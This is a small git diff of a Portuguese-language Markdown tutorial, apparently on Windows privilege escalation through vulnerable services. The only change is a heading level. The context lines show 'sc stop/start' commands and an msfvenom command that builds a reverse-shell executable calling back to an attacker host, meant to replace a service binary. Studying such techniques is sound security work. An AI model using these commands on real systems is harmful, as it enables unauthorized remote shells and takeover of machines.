@@ -55,7 +55,7 @@ sc stop $SERVICE
 # Iniciar o serviço
 sc start $SERVICE
 ```
-## Método II - Manipulando o executavel do serviço
+### Método II - Manipulando o executavel do serviço
 Nesse outro método vamos manipular o executavel do serviço vulnerável. Primeiro devemos gerar nosso exploit de shell reversa e enviar para a máquina alvo.
 ```
 msfvenom -p windows/shell_reverse_tcp lhost=$LHOST lport=LPORT -f exe > exploit.exe
